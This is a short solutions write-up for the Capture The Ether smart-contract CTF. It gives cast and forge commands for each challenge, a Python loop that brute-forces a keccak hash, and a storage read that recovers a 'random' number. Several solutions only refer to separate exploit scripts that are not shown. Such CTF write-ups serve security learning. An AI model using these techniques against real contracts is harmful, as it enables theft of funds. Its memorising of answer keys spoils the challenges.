# Capture The Ether

**Challenges**
- [Warmup](#warmup)
  - [Deploy a contract](#deploy-a-contract)
  - [Call me](#call-me)
  - [Choose a nickname](#choose-a-nickname)
- [Lotteries](#lotteries)
  - [Guess the number](#guess-the-number)
  - [Guess the secret number](#guess-the-secret-number)
  - [Guess the random number](#guess-the-random-number)
  - [Guess the new number](#guess-the-new-number)
- [Math](#math)
  - [Token sale](#token-sale)
  - [Token whale](#token-whale)
  - [Retirement fund](#retirement-fund)
  - [Mapping](#mapping)
- [Miscellaneous](#miscellaneous)
  - [Assume ownership](#assume-ownership)
  - [Token bank](#token-bank)

## Warmup

### Deploy a contract
Just send a transaction via Metamask.

### Call me
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "callme()"
```

### Choose a nickname
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "setNickname(bytes32)" $(cast --to-bytes32 1)
```

## Lotteries

### Guess the number
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 42 --value 1ether
```

### Guess the secret number
```py
import sha3

for i in range(1 << 8):
    k = sha3.keccak_256()
    k.update(bytes([i]))
    if k.hexdigest() == "db81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365":
        print(i)
        break
```
Result: `170`

```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 170 --value 1ether
```

### Guess the random number
```
$ cast storage $INSTANCE_ADDRESS 0
0x0000000000000000000000000000000000000000000000000000000000000066
```

```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 0x66 --value 1ether
```

### Guess the new number
```
forge script src/CaptureTheEther/GuessTheNewNumber/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

## Math

### Token sale
```
forge script src/CaptureTheEther/TokenSale/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Token whale
```
forge script src/CaptureTheEther/TokenWhale/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Retirement fund
```
forge script src/CaptureTheEther/RetirementFund/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Mapping
```
forge script src/CaptureTheEther/Mapping/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

## Miscellaneous

### Assume ownership
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "AssumeOwmershipChallenge()" 
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "authenticate()"
```

### Token bank
```
forge script src/CaptureTheEther/TokenBank/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```
